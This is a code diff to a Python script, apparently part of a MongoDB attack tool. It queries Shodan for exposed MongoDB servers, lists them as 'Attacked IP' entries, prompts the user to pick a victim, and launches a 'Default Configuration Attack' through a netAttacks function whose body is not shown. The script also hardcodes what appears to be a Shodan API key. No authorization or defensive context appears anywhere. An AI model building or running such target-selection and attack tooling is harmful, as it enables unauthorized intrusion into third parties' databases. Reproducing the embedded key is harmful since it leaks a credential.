@@ -1,6 +1,8 @@
 import  shodan
 import pymongo
 import socket;
+import globalVar as GlobalVar
+from mongo import netAttacks
 def scanMongoDBIP():
     SHODAN_API_KEY = "9kwHl4vdqoXjeKl7iXOHMvXGT3ny85Ig";
     api = shodan.Shodan(SHODAN_API_KEY);
@@ -9,8 +11,20 @@ def scanMongoDBIP():
         results = api.search('mongoDB')
 
         print 'Results found:%s' % results['total']
-        for result in results['matches']:
-            print 'Attacked IP:%s' % result['ip_str']
+        for index in range(1,10):
+            print str(index)+'_Attacked IP : %s' % results['matches'][index]['ip_str']
+#       select = raw_input("Get more IP (y/n)?")
+        select = raw_input("Select IP to attack:")
+        GlobalVar.set_victim(results['matches'][int(select)]['ip_str'])
+        GlobalVar.set_optionSet(0, True)
+        GlobalVar.set_myIP('127.0.0.1')
+        GlobalVar.set_optionSet(4, True)
+        start = raw_input("Start Default Configuration Attack(y/n)?")
+        if start == 'y':
+            netAttacks(GlobalVar.get_victim(), GlobalVar.get_dbPort(), GlobalVar.get_myIP(), GlobalVar.get_myPort())
+
+ #       for result in results['matches']:
+ #           print 'Attacked IP: %s' % result['ip_str']
             #print result['data']
             #print 'hostnames:' % result['hostnames'];
             #print ' '
